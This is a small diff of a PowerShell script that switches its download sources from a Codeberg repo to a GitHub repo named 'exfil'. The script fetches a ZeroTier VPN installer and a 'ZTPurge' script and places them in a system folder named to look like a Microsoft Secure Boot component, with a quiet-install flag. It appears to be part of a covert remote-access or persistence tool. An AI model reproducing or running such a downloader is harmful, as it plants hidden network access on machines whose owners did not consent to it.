@@ -1,8 +1,8 @@
 $AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
 foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
-$downloadUrl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/ZeroTierOne.msi"
-$ztpurgeurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/ZTPurge.ps1"
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
+$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/ZeroTierOne.msi"
+$ztpurgeurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/ZTPurge.ps1"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $ztclihandle = "-q"
